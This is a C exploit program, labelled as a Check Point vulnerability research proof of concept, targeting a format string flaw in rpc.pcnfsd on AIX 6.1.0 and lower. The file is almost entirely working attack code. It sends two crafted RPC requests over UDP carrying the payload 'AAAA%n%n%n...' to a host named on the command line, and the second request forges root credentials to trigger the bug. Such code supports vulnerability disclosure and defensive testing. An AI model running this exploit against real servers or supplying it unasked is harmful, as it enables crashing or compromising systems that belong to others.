/*************************************************************************
* Check Point Software Technologies - Vulnerability Discovery Team (VDT) *
* Rodrigo Rubira Branco - <rbranco *noSPAM* checkpoint.com>		 *
*									 *
* rpc.pcnfsd syslog format string vulnerability				 *
*************************************************************************/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <rpc/rpc.h>

#define PCNFSD_PROG 150001
#define PCNFSD_VERS 1
#define PCNFSD_PR_INIT 2
#define PCNFSD_PR_START 3

struct cm_send {
   char *s1;
   char *s2;
};

struct cm_send2 {
   char *s1;
   char *s2;
};

struct cm_reply {
   int i;
};

bool_t xdr_cm_send(XDR *xdrs, struct cm_send *objp)
{
   if(!xdr_wrapstring(xdrs, &objp->s1))
      return (FALSE);
   if(!xdr_wrapstring(xdrs, &objp->s2))
       return (FALSE);

   return (TRUE);
}

bool_t xdr_cm_send2(XDR *xdrs, struct cm_send2 *objp)
{
   if(!xdr_wrapstring(xdrs, &objp->s1))
      return (FALSE);
   if(!xdr_wrapstring(xdrs, &objp->s2))
       return (FALSE);

   return (TRUE);
}

bool_t xdr_cm_reply(XDR *xdrs, struct cm_reply *objp)
{
   if(!xdr_int(xdrs, &objp->i))
      return (FALSE);
   return (TRUE);
}

int
main(int argc, char *argv[])
{
   long ret, offset;
   int len, x, y, i;
   char *hostname, *b;

   CLIENT *cl;
   struct cm_send send;
   struct cm_send2 send2;
   struct cm_reply reply;
   struct timeval tm = { 10, 0 };
   enum clnt_stat stat;

   printf("-= rpc.pcnfsd remote format string exploit, tested against AIX 6.1.0 and lower =-\n");
   printf("-= Check Point Software Technologies - Vulnerability Discovery Team (VDT) =-\n");
   printf("-= Rodrigo Rubira Branco <rbranco *noSPAM* checkpoint.com> =-\n\n");


   if(argc < 2) {
      printf("Usage: %s [hostname]\n", argv[0]);
      exit(1);
   }

   hostname = argv[1];

   send.s1 = "AAAA%n%n%n%n%n%n%n%n%n"; // Create the dir on /var/spool/pcnfs
   send.s2 = "";
   send2.s1 = "AAAA%n%n%n%n%n%n%n%n%n";// Call the dir to trigger fmt bug
   send2.s2 = "";

   printf("\nSending PCNFSD_PR_INIT to the server ... ");

   if(!(cl=clnt_create(hostname,PCNFSD_PROG,PCNFSD_VERS,"udp"))){
        clnt_pcreateerror("\nerror");exit(-1);
   }
   stat=clnt_call(cl, PCNFSD_PR_INIT, xdr_cm_send, (caddr_t) &send,
                        xdr_cm_reply, (caddr_t) &reply, tm);

   clnt_destroy(cl);

   printf("done!\n");

   printf("Sending PCNFSD_PR_START procedure ... ");

   if(!(cl=clnt_create(hostname,PCNFSD_PROG,PCNFSD_VERS,"udp"))){
        clnt_pcreateerror("\nerror");exit(-1);
   }

   cl->cl_auth = authunix_create("localhost", 0, 0, 0, NULL);
   stat=clnt_call(cl, PCNFSD_PR_START, xdr_cm_send2, (caddr_t) &send2,
                        xdr_cm_reply, (caddr_t) &reply, tm);

   printf("done!\n");
   clnt_destroy(cl);

}